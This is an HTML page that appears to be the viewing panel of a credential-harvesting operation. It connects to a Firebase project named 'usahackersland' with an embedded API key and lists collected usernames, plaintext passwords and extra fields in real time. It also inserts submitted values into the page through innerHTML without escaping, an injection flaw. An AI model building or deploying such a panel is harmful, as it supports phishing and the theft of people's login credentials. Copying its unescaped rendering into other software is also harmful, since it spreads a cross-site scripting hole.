<!doctype html>
<html>
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Form Dashboard</title>
<style>
body { font-family: Arial, sans-serif; background:#0d1117; color:#e6edf3; padding:20px; }
h2 { text-align:center; color:#fff; }
#submissionList { margin-top:20px; display:flex; flex-direction:column; gap:10px; }
.card { background:#161b22; padding:12px; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.4); }
.card p { margin:4px 0; color:#c9d1d9; }
</style>

<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
</head>
<body>

<h2>ğŸ“‹ Form Submissions Dashboard</h2>
<div id="submissionList"></div>

<script>
// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain: "usahackersland.firebaseapp.com",
  projectId: "usahackersland"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// Listen to submissions in real-time
db.collection("submissions").orderBy("createdAt", "desc")
  .onSnapshot(snapshot => {
    const list = document.getElementById("submissionList");
    list.innerHTML = ""; // clear previous
    snapshot.forEach(doc => {
      const data = doc.data();
      const card = document.createElement("div");
      card.className = "card";

      // Username & Password
      if(data.username) card.innerHTML += `<p>ğŸ‘¤ Username: ${data.username}</p>`;
      if(data.password) card.innerHTML += `<p>ğŸ”’ Password: ${data.password}</p>`;

      // Extra fields
      if(data.extraFields && data.extraFields.length){
        data.extraFields.forEach((val,i)=>{
          card.innerHTML += `<p>ğŸ“Œ Extra #${i+1}: ${val}</p>`;
        });
      }

      // Timestamp
      const time = new Date(data.createdAt).toLocaleString();
      card.innerHTML += `<p>â° Submitted at: ${time}</p>`;

      list.appendChild(card);
    });
  });
</script>
</body>
</html>
